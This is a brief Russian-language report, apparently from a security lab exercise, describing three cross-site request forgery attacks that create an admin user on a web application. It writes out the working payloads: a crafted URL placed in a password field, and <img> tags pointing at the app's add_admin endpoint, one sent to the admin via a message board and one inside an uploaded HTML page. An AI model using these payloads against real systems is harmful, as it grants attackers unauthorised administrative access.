## Отчет

## Атака 1
При создании нового пользователя можно ввести в поле для пароля `http://92.63.179.34/add_admin?=username=user&password=user&submit=Add+User`, и пользователь успешно создастся

## Атака 2
В message board админу можно отправить `<img src="http://92.63.179.34/add_admin?=username=user&password=user&submit=Add+User">` и пользователь создастся

## Атака 3
В форму для отправки файлов можно вставить html страницу с таким кодом: `<img src="http://92.63.179.34/add_admin?username=user&password=user">`
